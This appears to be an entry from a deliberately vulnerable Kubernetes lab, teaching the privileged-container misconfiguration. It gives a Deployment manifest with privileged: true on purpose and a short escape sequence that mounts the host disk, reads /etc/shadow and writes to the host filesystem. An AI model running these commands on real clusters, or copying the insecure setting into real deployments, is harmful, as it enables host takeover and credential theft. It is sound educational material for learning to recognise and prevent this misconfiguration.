---
title: "K8S: Privileged Container"
author: rjulian
date: 2023-09-04 11:33:00 -0300
categories: [Kubernetes]
tags: [k8s, permissions]
---

## Overview

Running a container in privileged mode is a configuration option for pods requiring access to the host's (i.e. node) resources. This configuration option exists, as there're applications that will require some level of access to resources on the host. Keeping with the practice of least privilege, however, this should be strictly forbidden for pods that do not require it.

The CIS Benchmark for Kubernetes includes the recommendation `5.2.2 Minimize the admission of privileged containers`.

## Deployment

### Code
```yaml
apiVersion: v1
kind: Service
metadata:
  name: dvldb-privileged-container-service-c800b550
spec:
  ports:
    - port: 80
      targetPort: 8080
  selector:
    app: dvldb-privileged-container
  type: LoadBalancer
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dvldb-privileged-container-deployment-c878e6e7
spec:
  replicas: 2
  selector:
    matchLabels:
      app: dvldb-privileged-container
  template:
    metadata:
      labels:
        app: dvldb-privileged-container
    spec:
      containers:
        - image: nginx:latest
          name: nginx
          ports:
            - containerPort: 8080
          securityContext:
            privileged: true
```

### Implementation

```bash
kubectl apply -f dvldb-privileged-container.k8s.yaml
```

## Exploitation

### Mount Host Filesystem

From within the container, you can mount filesystems within the `/dev` directory.

```bash
mount /dev/vda1 /tmp/devfs
ls /tmp/devfs/
cat /tmp/devfs/etc/shadow
touch /tmp/devfs/file
```

## Resources

* https://kubernetes.io/docs/concepts/security/pod-security-standards/
* https://www.cncf.io/blog/2020/10/16/hack-my-mis-configured-kubernetes-privileged-pods/
